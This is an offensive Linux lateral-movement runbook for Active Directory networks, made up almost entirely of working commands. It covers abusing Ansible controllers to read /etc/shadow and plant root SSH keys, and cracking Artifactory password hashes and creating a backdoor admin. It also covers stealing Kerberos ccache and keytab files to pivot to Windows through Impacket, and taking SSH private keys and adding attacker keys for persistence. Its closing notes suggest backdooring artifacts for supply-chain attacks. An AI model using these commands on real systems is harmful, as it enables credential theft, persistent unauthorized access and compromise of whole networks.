# Linux Lateral Movement Runbook

> Linux hosts in AD environments often have Kerberos tickets, SSH keys, and Ansible/Artifactory.

---

## Ansible Lateral Movement

```bash
# Detect Ansible
ansible --version
ls /etc/ansible/
cat /etc/ansible/hosts          # inventory — list of targets
grep ansibleadm /etc/passwd

# Run command on all nodes (if you have controller access)
ansible all -a "whoami"
ansible all -a "cat /etc/shadow" --become    # as root

# Find world-writable playbooks
find /etc/ansible /home -name "*.yml" -writable 2>/dev/null
```

**Inject into world-writable playbook:**
```yaml
- name: Add SSH key for root
  become: yes
  blockinfile:
    path: /root/.ssh/authorized_keys
    create: yes
    block: |
      ssh-rsa AAAA... youremail@kali
```

**Find leaked creds in syslog:**
```bash
grep -i password /var/log/syslog
```

---

## Artifactory Lateral Movement

```bash
# Detect
ps aux | grep artifactory
netstat -tulnp | grep 8081

# Extract password hashes from backup
cat /opt/jfrog/artifactory/var/backup/access/*.json | grep -oP '"password":"\K[^"]+' > hashes.txt
hashcat -m 3200 hashes.txt rockyou.txt    # bcrypt

# Create backdoor admin (restart required)
echo "haxmin*StrongPass123!" > /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
# Then restart Artifactory
```

---

## Kerberos on Linux (AD-Joined Hosts)

```bash
# Check for existing tickets
klist
echo $KRB5CCNAME

# Find ticket files
find /tmp -name "krb5cc_*" 2>/dev/null

# Steal and use a ticket
cp /tmp/krb5cc_1234 /tmp/stolen.ccache
export KRB5CCNAME=/tmp/stolen.ccache
klist                                    # verify
kinit -R                                 # renew ticket

# Get service tickets for lateral movement
kvno HOST/server.domain.com@DOMAIN.COM

# Use Impacket over SOCKS tunnel
ssh -D 9050 user@linux-host              # create SOCKS tunnel
proxychains4 python3 psexec.py -k user@winserver.corp.com  # move to Windows
```

**Find keytab files (no password needed for kinit):**
```bash
find / -name "*.keytab" -readable 2>/dev/null
kinit -k -t /path/to/user.keytab user@DOMAIN.COM
```

---

## SSH Key Theft

```bash
# Find SSH keys on compromised Linux host
find /home /root -name "id_rsa" -readable 2>/dev/null
find /home /root -name "authorized_keys" 2>/dev/null

# Use stolen key
chmod 600 id_rsa
ssh -i id_rsa user@<NEXT_HOST>

# Add your key for persistence
echo "ssh-rsa AAAA... kali" >> /home/user/.ssh/authorized_keys
```

---

## Notes
- **Kerberos Linux → Windows**: With valid ccache, use Impacket's `psexec.py`, `wmiexec.py` with `-k --no-pass`
- **Ansible controller = golden ticket**: Full access to all inventory hosts
- **Artifactory write = supply chain**: Backdoor packages, serve malicious artifacts
